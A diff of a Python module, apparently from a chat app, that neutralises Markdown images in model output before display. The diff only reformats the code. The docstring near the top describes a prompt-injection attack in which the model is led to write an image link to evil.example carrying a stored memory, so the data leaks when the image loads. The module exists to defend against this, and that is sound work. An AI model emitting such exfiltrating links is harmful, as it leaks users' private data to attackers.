@@ -5,6 +5,7 @@ could make the model write ![](https://evil.example/?d=<a memory>), and the data
 would leave on display. ``disarm_images`` is applied to what the model wrote just
 before it is drawn (``ChatMessage._shown``). Pure functions, no Flet.
 """
+
 from __future__ import annotations
 
 import re
@@ -65,7 +66,9 @@ def _fenced_parts(text: str):
         opener = _FENCE.match(line)
         if fence is None:
             # A ``` fence whose info string holds a backtick is no fence.
-            if opener and not (opener.group(1)[0] == "`" and "`" in line[opener.end():]):
+            if opener and not (
+                opener.group(1)[0] == "`" and "`" in line[opener.end() :]
+            ):
                 if buffer:
                     yield False, "".join(buffer)
                 buffer = [line]
@@ -74,7 +77,11 @@ def _fenced_parts(text: str):
                 buffer.append(line)
         else:
             buffer.append(line)
-            closing = opener and opener.group(1)[0] == fence[0] and len(opener.group(1)) >= len(fence)
+            closing = (
+                opener
+                and opener.group(1)[0] == fence[0]
+                and len(opener.group(1)) >= len(fence)
+            )
             if closing and not line.strip().strip(fence[0]):
                 yield True, "".join(buffer)
                 buffer = []
@@ -87,7 +94,7 @@ def _disarm_prose(text: str) -> str:
     out: list[str] = []
     position = 0
     for span in _CODE_SPAN.finditer(text):
-        out.append(_disarm_plain(text[position:span.start()]))
+        out.append(_disarm_plain(text[position : span.start()]))
         out.append(_split_quietly(span.group(0)))
         position = span.end()
     out.append(_disarm_plain(text[position:]))
@@ -96,7 +103,11 @@ def _disarm_prose(text: str) -> str:
 
 def _tag_attribute(tag: str, name: str) -> str:
     found = re.search(_TAG_ATTR.format(name=name), tag, re.IGNORECASE)
-    return next((group for group in found.groups() if group is not None), "") if found else ""
+    return (
+        next((group for group in found.groups() if group is not None), "")
+        if found
+        else ""
+    )
 
 
 def _img_tag_as_link(match: re.Match) -> str:
